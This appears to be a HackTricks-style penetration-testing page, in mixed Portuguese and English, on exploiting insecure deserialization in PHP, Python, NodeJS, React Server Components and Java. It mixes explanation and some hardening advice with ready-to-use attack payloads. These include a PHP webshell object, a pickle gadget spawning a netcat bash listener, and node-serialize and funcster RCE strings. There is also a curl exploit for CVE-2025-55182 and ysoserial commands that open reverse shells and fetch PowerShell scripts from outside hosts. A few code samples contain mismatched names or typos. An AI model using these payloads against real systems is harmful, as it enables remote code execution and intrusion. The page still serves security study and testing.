# Deserialization

{{#include ../../banners/hacktricks-training.md}}

## Informações Básicas

**Serialization** é entendido como o método de converter um objeto em um formato que pode ser preservado, com a intenção de armazenar o objeto ou transmiti-lo como parte de um processo de comunicação. Essa técnica é comumente empregada para garantir que o objeto possa ser recriado posteriormente, mantendo sua estrutura e estado.

**Deserialization**, por outro lado, é o processo que contrabalança a serialization. Envolve pegar dados que foram estruturados em um formato específico e reconstruí-los de volta em um objeto.

Deserialization pode ser perigoso porque potencialmente **permite que atacantes manipulem os dados serializados para executar código malicioso** ou provoquem comportamento inesperado na aplicação durante o processo de reconstrução do objeto.

## PHP

Em PHP, métodos mágicos específicos são utilizados durante os processos de serialization e deserialization:

- `__sleep`: Invocado quando um objeto está sendo serializado. Esse método deve retornar um array com os nomes de todas as propriedades do objeto que devem ser serializadas. É comumente usado para gravar dados pendentes ou executar tarefas de limpeza similares.
- `__wakeup`: Chamado quando um objeto está sendo deserializado. É usado para restabelecer quaisquer conexões de banco de dados que possam ter sido perdidas durante a serialization e para executar outras tarefas de reinicialização.
- `__unserialize`: Esse método é chamado em vez de `__wakeup` (se existir) quando um objeto está sendo deserializado. Ele fornece mais controle sobre o processo de deserialization em comparação com `__wakeup`.
- `__destruct`: Esse método é chamado quando um objeto está prestes a ser destruído ou quando o script termina. Tipicamente usado para tarefas de limpeza, como fechar handles de arquivo ou conexões de banco de dados.
- `__toString`: Esse método permite que um objeto seja tratado como uma string. Pode ser usado para ler um arquivo ou outras tarefas baseadas nas chamadas de função dentro dele, efetivamente fornecendo uma representação textual do objeto.
```php
<?php
class test {
public $s = "This is a test";
public function displaystring(){
echo $this->s.'<br />';
}
public function __toString()
{
echo '__toString method called';
}
public function __construct(){
echo "__construct method called";
}
public function __destruct(){
echo "__destruct method called";
}
public function __wakeup(){
echo "__wakeup method called";
}
public function __sleep(){
echo "__sleep method called";
return array("s"); #The "s" makes references to the public attribute
}
}

$o = new test();
$o->displaystring();
$ser=serialize($o);
echo $ser;
$unser=unserialize($ser);
$unser->displaystring();

/*
php > $o = new test();
__construct method called
__destruct method called
php > $o->displaystring();
This is a test<br />

php > $ser=serialize($o);
__sleep method called

php > echo $ser;
O:4:"test":1:{s:1:"s";s:14:"This is a test";}

php > $unser=unserialize($ser);
__wakeup method called
__destruct method called

php > $unser->displaystring();
This is a test<br />
*/
?>
```
Se você olhar os resultados, pode ver que as funções **`__wakeup`** e **`__destruct`** são chamadas quando o objeto é desserializado. Note que em vários tutoriais você encontrará que a função **`__toString`** é chamada ao tentar imprimir algum atributo, mas aparentemente isso **não está acontecendo mais**.

> [!WARNING]
> O método **`__unserialize(array $data)`** é chamado **em vez de `__wakeup()`** se ele estiver implementado na classe. Isso permite que você desserialize o objeto fornecendo os dados serializados como um array. Você pode usar este método para desserializar propriedades e executar quaisquer tarefas necessárias durante a desserialização.
>
> ```php
> class MyClass {
>    private $property;
>
>    public function __unserialize(array $data): void {
>        $this->property = $data['property'];
>        // Perform any necessary tasks upon deserialization.
>    }
> }
> ```

Você pode ler um exemplo explicado em **PHP aqui**: [https://www.notsosecure.com/remote-code-execution-via-php-unserialize/](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/), aqui [https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf) ou aqui [https://securitycafe.ro/2015/01/05/understanding-php-object-injection/](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)

### PHP Desserialização + Autoload Classes

Você pode abusar da funcionalidade autoload do PHP para carregar arquivos php arbitrários e mais:


{{#ref}}
php-deserialization-+-autoload-classes.md
{{#endref}}

### Serializando Valores Referenciados

Se por algum motivo você quiser serializar um valor como uma **referência para outro valor serializado** você pode:
```php
<?php
class AClass {
public $param1;
public $param2;
}

$o = new WeirdGreeting;
$o->param1 =& $o->param22;
$o->param = "PARAM";
$ser=serialize($o);
```
### Prevenção de PHP Object Injection com `allowed_classes`

> [!INFO]
> O suporte para o **segundo argumento** de `unserialize()` (o array `$options`) foi adicionado no **PHP 7.0**. Em versões mais antigas a função aceita apenas a string serializada, tornando impossível restringir quais classes podem ser instanciadas.

`unserialize()` irá **instanciar todas as classes** que encontrar dentro do fluxo serializado, a menos que seja instruído de outra forma. Desde o PHP 7 o comportamento pode ser restrito com a opção [`allowed_classes`](https://www.php.net/manual/en/function.unserialize.php):
```php
// NEVER DO THIS – full object instantiation
$object = unserialize($userControlledData);

// SAFER – disable object instantiation completely
$object = unserialize($userControlledData, [
'allowed_classes' => false    // no classes may be created
]);

// Granular – only allow a strict white-list of models
$object = unserialize($userControlledData, [
'allowed_classes' => [MyModel::class, DateTime::class]
]);
```
Se **`allowed_classes` for omitido _ou_ o código for executado em PHP < 7.0**, a chamada se torna **perigosa** pois um atacante pode criar uma payload que abusa de métodos mágicos como `__wakeup()` ou `__destruct()` para obter Remote Code Execution (RCE).

#### Exemplo do mundo real: Everest Forms (WordPress) CVE-2025-52709

O plugin do WordPress **Everest Forms ≤ 3.2.2** tentou ser defensivo com um wrapper auxiliar mas esqueceu das versões antigas do PHP:
```php
function evf_maybe_unserialize($data, $options = array()) {
if (is_serialized($data)) {
if (version_compare(PHP_VERSION, '7.1.0', '>=')) {
// SAFE branch (PHP ≥ 7.1)
$options = wp_parse_args($options, array('allowed_classes' => false));
return @unserialize(trim($data), $options);
}
// DANGEROUS branch (PHP < 7.1)
return @unserialize(trim($data));
}
return $data;
}
```
Em servidores que ainda executavam **PHP ≤ 7.0** este segundo ramo levava a um clássico **PHP Object Injection** quando um administrador abria um envio de formulário malicioso. Um exploit payload mínimo poderia ser:
```
O:8:"SomeClass":1:{s:8:"property";s:28:"<?php system($_GET['cmd']); ?>";}
```
Assim que o admin visualizou a entrada, o objeto foi instanciado e `SomeClass::__destruct()` foi executado, resultando em execução arbitrária de código.

**Principais lições**
1. Sempre passe `['allowed_classes' => false]` (ou uma white-list estrita) ao chamar `unserialize()`.
2. Audite os wrappers defensivos – eles frequentemente se esquecem das ramificações legadas do PHP.
3. Atualizar para **PHP ≥ 7.x** por si só *não* é suficiente: a opção ainda precisa ser fornecida explicitamente.

---

### PHPGGC (ysoserial for PHP)

[**PHPGGC**](https://github.com/ambionics/phpggc) pode ajudar você a gerar payloads para abusar de deserializações PHP.\
Observe que, em vários casos, você **não conseguirá encontrar uma forma de abusar de uma deserialização no código-fonte** da aplicação, mas pode ser capaz de **abusar do código de extensões PHP externas.**\
Portanto, se puder, verifique o `phpinfo()` do servidor e **pesquise na internet** (e até nos **gadgets** do **PHPGGC**) por algum gadget que você possa abusar.

### phar:// metadata deserialization

Se você encontrou um LFI que apenas lê o arquivo e não executa o código php dentro dele, por exemplo usando funções como _**file_get_contents(), fopen(), file() or file_exists(), md5_file(), filemtime() or filesize()**_**, você pode tentar abusar de uma **deserialização** que ocorre ao **ler** um **arquivo** usando o protocolo **phar**.\
Para mais informações leia o post a seguir:


{{#ref}}
../file-inclusion/phar-deserialization.md
{{#endref}}

## Python

### **Pickle**

Quando o objeto for unpickled, a função \_\_\_reduce\_\_\_ será executada.\
Ao ser explorado, o servidor pode retornar um erro.
```python
import pickle, os, base64
class P(object):
def __reduce__(self):
return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print(base64.b64encode(pickle.dumps(P())))
```
Before checking the bypass technique, try using `print(base64.b64encode(pickle.dumps(P(),2)))` to generate an object that is compatible with python2 if you're running python3.

For more information about escaping from **pickle jails** check:


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

### Yaml **&** jsonpickle

The following page present the technique to **abuse an unsafe deserialization in yamls** python libraries and finishes with a tool that can be used to generate RCE deserialization payload for **Pickle, PyYAML, jsonpickle and ruamel.yaml**:


{{#ref}}
python-yaml-deserialization.md
{{#endref}}

### Class Pollution (Python Prototype Pollution)


{{#ref}}
../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md
{{#endref}}

## NodeJS

### JS Magic Functions

JS **doesn't have "magic" functions** like PHP or Python that are going to be executed just for creating an object. But it has some **functions** that are **frequently used even without directly calling them** such as **`toString`**, **`valueOf`**, **`toJSON`**.\
If abusing a deserialization you can **compromise these functions to execute other code** (potentially abusing prototype pollutions) you could execute arbitrary code when they are called.

Another **"magic" way to call a function** without calling it directly is by **compromising an object that is returned by an async function** (promise). Because, if you **transform** that **return object** in another **promise** with a **property** called **"then" of type function**, it will be **executed** just because it's returned by another promise. _Siga_ [_**este link**_](https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/) _para mais informações._
```javascript
// If you can compromise p (returned object) to be a promise
// it will be executed just because it's the return object of an async function:
async function test_resolve() {
const p = new Promise((resolve) => {
console.log("hello")
resolve()
})
return p
}

async function test_then() {
const p = new Promise((then) => {
console.log("hello")
return 1
})
return p
}

test_ressolve()
test_then()
//For more info: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/
```
### `__proto__` and `prototype` pollution

Se quiser aprender sobre esta técnica **consulte o tutorial a seguir**:


{{#ref}}
nodejs-proto-prototype-pollution/
{{#endref}}

### [node-serialize](https://www.npmjs.com/package/node-serialize)

Esta biblioteca permite serializar funções. Exemplo:
```javascript
var y = {
rce: function () {
require("child_process").exec("ls /", function (error, stdout, stderr) {
console.log(stdout)
})
},
}
var serialize = require("node-serialize")
var payload_serialized = serialize.serialize(y)
console.log("Serialized: \n" + payload_serialized)
```
O **objeto serializado** ficará assim:
```bash
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"}
```
Você pode ver no exemplo que, quando uma função é serializada, a flag `_$$ND_FUNC$$_` é anexada ao objeto serializado.

Dentro do arquivo `node-serialize/lib/serialize.js` você pode encontrar a mesma flag e como o código a está usando.

![](<../../images/image (351).png>)

![](<../../images/image (446).png>)

Como você pode ver no último trecho de código, **se a flag for encontrada** `eval` é usado para desserializar a função, então basicamente **a entrada do usuário está sendo usada dentro da função `eval`**.

No entanto, **apenas serializar** uma função **não a executará** pois seria necessário que alguma parte do código estivesse **chamando `y.rce`** em nosso exemplo e isso é altamente **improvável**.\
De qualquer forma, você pode simplesmente **modificar o objeto serializado** **adicionando alguns parênteses** para autoexecutar a função serializada quando o objeto for desserializado.\
No próximo trecho de código **observe o último parêntese** e como a função `unserialize` irá executar o código automaticamente:
```javascript
var serialize = require("node-serialize")
var test = {
rce: "_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()",
}
serialize.unserialize(test)
```
Como indicado anteriormente, esta biblioteca irá pegar o código após `_$$ND_FUNC$$_` e irá **executá-lo** usando `eval`. Portanto, para **auto-executar código** você pode **remover a parte de criação da função** e o último parêntese e **simplesmente executar um JS oneliner** como no exemplo a seguir:
```javascript
var serialize = require("node-serialize")
var test =
"{\"rce\":\"_$$ND_FUNC$$_require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })\"}"
serialize.unserialize(test)
```
You can [**find here**](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) **mais informações** sobre como explorar esta vulnerabilidade.

### [funcster](https://www.npmjs.com/package/funcster)

Um aspecto notável do **funcster** é a inacessibilidade dos **objetos built-in padrão**; eles ficam fora do escopo acessível. Essa restrição impede a execução de código que tenta invocar métodos em objetos built-in, levando a exceções como "ReferenceError: console is not defined" quando comandos como `console.log()` ou `require(something)` são usados.

Apesar dessa limitação, a restauração do acesso completo ao contexto global, incluindo todos os objetos built-in padrão, é possível através de uma abordagem específica. Ao aproveitar o contexto global diretamente, é possível contornar essa restrição. Por exemplo, o acesso pode ser restabelecido usando o trecho a seguir:
```javascript
funcster = require("funcster")
//Serialization
var test = funcster.serialize(function () {
return "Hello world!"
})
console.log(test) // { __js_function: 'function(){return"Hello world!"}' }

//Deserialization with auto-execution
var desertest1 = { __js_function: 'function(){return "Hello world!"}()' }
funcster.deepDeserialize(desertest1)
var desertest2 = {
__js_function: 'this.constructor.constructor("console.log(1111)")()',
}
funcster.deepDeserialize(desertest2)
var desertest3 = {
__js_function:
"this.constructor.constructor(\"require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });\")()",
}
funcster.deepDeserialize(desertest3)
```
**Para**[ **mais informações leia esta fonte**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### [**serialize-javascript**](https://www.npmjs.com/package/serialize-javascript)

O pacote **serialize-javascript** foi projetado exclusivamente para fins de serialização, não possuindo quaisquer capacidades de desserialização incorporadas. Os usuários são responsáveis por implementar seu próprio método de desserialização. O uso direto de `eval` é sugerido pelo exemplo oficial para desserializar dados serializados:
```javascript
function deserialize(serializedJavascript) {
return eval("(" + serializedJavascript + ")")
}
```
Se esta função for usada para desserializar objetos, você pode **explorá-la facilmente**:
```javascript
var serialize = require("serialize-javascript")
//Serialization
var test = serialize(function () {
return "Hello world!"
})
console.log(test) //function() { return "Hello world!" }

//Deserialization
var test =
"function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"
deserialize(test)
```
**For**[ **more information read this source**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### Cryo library

Nas páginas seguintes você pode encontrar informações sobre como abusar desta library para executar comandos arbitrários:

- [https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)
- [https://hackerone.com/reports/350418](https://hackerone.com/reports/350418)

### React Server Components / react-server-dom-webpack Server Actions Abuse (CVE-2025-55182)

React Server Components (RSC) dependem de `react-server-dom-webpack` (RSDW) para decodificar submissões de server action que são enviadas como `multipart/form-data`. Cada submissão de action contém:

- `$ACTION_REF_<n>` parts que referenciam a action sendo invocada.
- `$ACTION_<n>:<m>` parts cujo corpo é JSON como `{"id":"module-path#export","bound":[arg0,arg1,...]}`.

Na versão **19.2.0** o helper `decodeAction(formData, serverManifest)` confia cegamente tanto na **string `id`** (selecionando qual export do módulo chamar) quanto no **array `bound`** (os argumentos). Se um atacante conseguir alcançar o endpoint que encaminha requests para `decodeAction`, ele pode invocar qualquer server action exportada com parâmetros controlados pelo atacante mesmo sem um front-end React (CVE-2025-55182). A receita end-to-end é:

1. **Aprenda o identificador da action.** A saída do bundle, traces de erro ou leaked manifests tipicamente revelam strings como `app/server-actions#generateReport`.
2. **Recrie o payload multipart.** Construa uma parte `$ACTION_REF_0` e um corpo JSON `$ACTION_0:0` contendo o identificador e argumentos arbitrários.
3. **Deixe `decodeAction` despachar isso.** O helper resolve o módulo a partir de `serverManifest`, importa a exportação e retorna um callable que o servidor executa imediatamente.

Example payload hitting `/formaction`:
```http
POST /formaction HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----BOUNDARY

------BOUNDARY
Content-Disposition: form-data; name="$ACTION_REF_0"

------BOUNDARY
Content-Disposition: form-data; name="$ACTION_0:0"

{"id":"app/server-actions#generateReport","bound":["acme","pdf & whoami"]}
------BOUNDARY--
```
Ou com curl:
```bash
curl -sk -X POST http://target/formaction \
-F '$ACTION_REF_0=' \
-F '$ACTION_0:0={"id":"app/server-actions#generateReport","bound":["acme","pdf & whoami"]}'
```
O array `bound` popula diretamente os parâmetros server-action. No laboratório vulnerável o gadget se parece com:
```javascript
const { exec } = require("child_process");
const util = require("util");
const pexec = util.promisify(exec);

async function generateReport(project, format) {
const cmd = `node ./scripts/report.js --project=${project} --format=${format}`;
const { stdout } = await pexec(cmd);
return stdout;
}
```
Supplying `format = "pdf & whoami"` makes `/bin/sh -c` run the legitimate report generator and then `whoami`, with both outputs delivered inside the JSON action response. Any server action that wraps filesystem primitives, database drivers or other interpreters can be abused the same way once the attacker controls the `bound` data.

Um atacante nunca precisa de um cliente React real — qualquer ferramenta HTTP que emita a forma multipart `$ACTION_*` pode chamar server actions diretamente e encadear a saída JSON resultante em um RCE primitive.

## Java - HTTP

In Java, **deserialization callbacks are executed during the process of deserialization**. This execution can be exploited by attackers who craft malicious payloads that trigger these callbacks, leading to potential execution of harmful actions.

### Fingerprints

#### White Box

To identify potential serialization vulnerabilities in the codebase search for:

- Classes that implement the `Serializable` interface.
- Usage of `java.io.ObjectInputStream`, `readObject`, `readUnshare` functions.

Pay extra attention to:

- `XMLDecoder` utilized with parameters defined by external users.
- `XStream`'s `fromXML` method, especially if the XStream version is less than or equal to 1.46, as it is susceptible to serialization issues.
- `ObjectInputStream` coupled with the `readObject` method.
- Implementation of methods such as `readObject`, `readObjectNodData`, `readResolve`, or `readExternal`.
- `ObjectInputStream.readUnshared`.
- General use of `Serializable`.

#### Black Box

For black box testing, look for specific **signatures or "Magic Bytes"** that denote java serialized objects (originating from `ObjectInputStream`):

- Hexadecimal pattern: `AC ED 00 05`.
- Base64 pattern: `rO0`.
- HTTP response headers with `Content-type` set to `application/x-java-serialized-object`.
- Hexadecimal pattern indicating prior compression: `1F 8B 08 00`.
- Base64 pattern indicating prior compression: `H4sIA`.
- Web files with the `.faces` extension and the `faces.ViewState` parameter. Discovering these patterns in a web application should prompt an examination as detailed in the [post about Java JSF ViewState Deserialization](java-jsf-viewstate-.faces-deserialization.md).
```
javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
```
### Verificar se é vulnerável

Se quiser **aprender como funciona um Java Deserialized exploit** consulte [**Basic Java Deserialization**](basic-java-deserialization-objectinputstream-readobject.md), [**Java DNS Deserialization**](java-dns-deserialization-and-gadgetprobe.md), and [**CommonsCollection1 Payload**](java-transformers-to-rutime-exec-payload.md).

#### SignedObject-gated deserialization e pre-auth reachability

Codebases modernas às vezes encapsulam a deserialização com `java.security.SignedObject` e validam uma assinatura antes de chamar `getObject()` (que desserializa o objeto interno). Isso previne classes de gadget arbitrárias no topo, mas ainda pode ser explorável se um atacante conseguir uma assinatura válida (por exemplo, comprometimento da chave privada ou um signing oracle). Adicionalmente, fluxos de tratamento de erro podem emitir tokens vinculados à sessão para usuários não autenticados, expondo sinks protegidos pré-auth.

Para um estudo de caso concreto com requests, IoCs, e orientações de hardening, veja:

{{#ref}}
java-signedobject-gated-deserialization.md
{{#endref}}

#### White Box Test

Você pode verificar se há alguma aplicação instalada com vulnerabilidades conhecidas.
```bash
find . -iname "*commons*collection*"
grep -R InvokeTransformer .
```
You could try to **verificar todas as bibliotecas** conhecidas por serem vulneráveis e para as quais [**Ysoserial** ](https://github.com/frohoff/ysoserial)can provide an exploit for. Or you could check the libraries indicated on [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json).\
You could also use [**gadgetinspector**](https://github.com/JackOfMostTrades/gadgetinspector) to search for possible gadget chains that can be exploited.\
When running **gadgetinspector** (after building it) don't care about the tons of warnings/errors that it's going through and let it finish. It will write all the findings under _gadgetinspector/gadget-results/gadget-chains-year-month-day-hore-min.txt_. Please, notice that **gadgetinspector won't create an exploit and it may indicate false positives**.

#### Black Box Test

Using the Burp extension [**gadgetprobe**](java-dns-deserialization-and-gadgetprobe.md) you can identify **which libraries are available** (and even the versions). With this information it could be **easier to choose a payload** to exploit the vulnerability.\
[**Read this to learn more about GadgetProbe**](java-dns-deserialization-and-gadgetprobe.md#gadgetprobe)**.**\
GadgetProbe is focused on **`ObjectInputStream` deserializations**.

Using Burp extension [**Java Deserialization Scanner**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner) you can **identify vulnerable libraries** exploitable with ysoserial and **exploit** them.\
[**Read this to learn more about Java Deserialization Scanner.**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)\
Java Deserialization Scanner is focused on **`ObjectInputStream`** deserializations.

You can also use [**Freddy**](https://github.com/nccgroup/freddy) to **detect deserializations** vulnerabilities in **Burp**. This plugin will detect **not only `ObjectInputStream`** related vulnerabilities but **also** vulnerabilidades from **Json** an **Yml** deserialization libraries. In active mode, it will try to confirm them using sleep or DNS payloads.\
[**You can find more information about Freddy here.**](https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2018/june/finding-deserialisation-issues-has-never-been-easier-freddy-the-serialisation-killer/)

**Serialization Test**

Not all is about checking if any vulnerable library is used by the server. Sometimes you could be able to **change the data inside the serialized object and bypass some checks** (maybe grant you admin privileges inside a webapp).\
If you find a java serialized object being sent to a web application, **you can use** [**SerializationDumper**](https://github.com/NickstaDB/SerializationDumper) **to print in a more human readable format the serialization object that is sent**. Knowing which data are you sending would be easier to modify it and bypass some checks.

### **Exploit**

#### **ysoserial**

The main tool to exploit Java deserializations is [**ysoserial**](https://github.com/frohoff/ysoserial) ([**download here**](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)). You can also consider using [**ysoseral-modified**](https://github.com/pimps/ysoserial-modified) which will allow you to use complex commands (with pipes for example).\
Note that this tool is **focused** on exploiting **`ObjectInputStream`**.\
I would **start using the "URLDNS"** payload **before a RCE** payload to test if the injection is possible. Anyway, note that maybe the "URLDNS" payload is not working but other RCE payload is.
```bash
# PoC to make the application perform a DNS req
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net > payload

# PoC RCE in Windows
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1' > payload
# Time, I noticed the response too longer when this was used
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c timeout 5" > payload
# Create File
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c echo pwned> C:\\\\Users\\\\username\\\\pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA"
## In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')
## To encode something in Base64 for Windows PS from linux you can use: echo -n "<PAYLOAD>" | iconv --to-code UTF-16LE | base64 -w0
# Reverse Shell
## Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA"

#PoC RCE in Linux
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "ping -c 5 192.168.1.4" > payload
# Time
## Using time in bash I didn't notice any difference in the timing of the response
# Create file
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "touch /tmp/pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net" > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# Reverse shell
## Encoded: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0
## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"

# Base64 encode payload in base64
base64 -w0 payload
```
Ao criar um payload para **java.lang.Runtime.exec()** você **não pode usar caracteres especiais** como ">" ou "|" para redirecionar a saída de uma execução, "$()" para executar comandos ou mesmo **passar argumentos** para um comando separados por **espaços** (você pode fazer `echo -n "hello world"` mas não pode fazer `python2 -c 'print "Hello world"'`). Para codificar corretamente o payload você pode [usar esta página](http://www.jackson-t.ca/runtime-exec-payloads.html).

Sinta-se à vontade para usar o próximo script para criar **todos os possíveis code execution payloads** para Windows e Linux e então testá-los na página web vulnerável:
```python
import os
import base64

# You may need to update the payloads
payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'Vaadin1', 'Wicket1']
def generate(name, cmd):
for payload in payloads:
final = cmd.replace('REPLACE', payload)
print 'Generating ' + payload + ' for ' + name + '...'
command = os.popen('java -jar ysoserial.jar ' + payload + ' "' + final + '"')
result = command.read()
command.close()
encoded = base64.b64encode(result)
if encoded != "":
open(name + '_intruder.txt', 'a').write(encoded + '\n')

generate('Windows', 'ping -n 1 win.REPLACE.server.local')
generate('Linux', 'ping -c 1 nix.REPLACE.server.local')
```
#### serialkillerbypassgadgets

Você pode **usar** [**https://github.com/pwntester/SerialKillerBypassGadgetCollection**](https://github.com/pwntester/SerialKillerBypassGadgetCollection) **junto com ysoserial para criar mais exploits**. Mais informações sobre esta ferramenta nos **slides da palestra** onde a ferramenta foi apresentada: [https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next_slideshow=1](https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next_slideshow=1)

#### marshalsec

[**marshalsec** ](https://github.com/mbechler/marshalsec) pode ser usado para gerar payloads para explorar diferentes **Json** e **Yml** bibliotecas de serialização em Java.\
Para compilar o projeto precisei **adicionar** estas **dependências** ao `pom.xml`:
```html
<dependency>
<groupId>javax.activation</groupId>
<artifactId>activation</artifactId>
<version>1.1.1</version>
</dependency>

<dependency>
<groupId>com.sun.jndi</groupId>
<artifactId>rmiregistry</artifactId>
<version>1.2.1</version>
<type>pom</type>
</dependency>
```
**Instale maven**, e **compile** o projeto:
```bash
sudo apt-get install maven
mvn clean package -DskipTests
```
#### FastJSON

Leia mais sobre esta biblioteca Java JSON: [https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html](https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html)

### Laboratórios

- Se quiser testar alguns ysoserial payloads você pode **executar este webapp**: [https://github.com/hvqzao/java-deserialize-webapp](https://github.com/hvqzao/java-deserialize-webapp)
- [https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)

### Por que

Java utiliza muita serialização para vários propósitos, como:

- **Requisições HTTP**: A serialização é amplamente empregada no gerenciamento de parâmetros, ViewState, cookies, etc.
- **RMI (Remote Method Invocation)**: O protocolo Java RMI, que depende inteiramente de serialização, é uma peça fundamental para comunicação remota em aplicações Java.
- **RMI over HTTP**: Este método é comumente usado por aplicações web de cliente pesado baseadas em Java, utilizando serialização para todas as comunicações de objetos.
- **JMX (Java Management Extensions)**: JMX utiliza serialização para transmitir objetos pela rede.
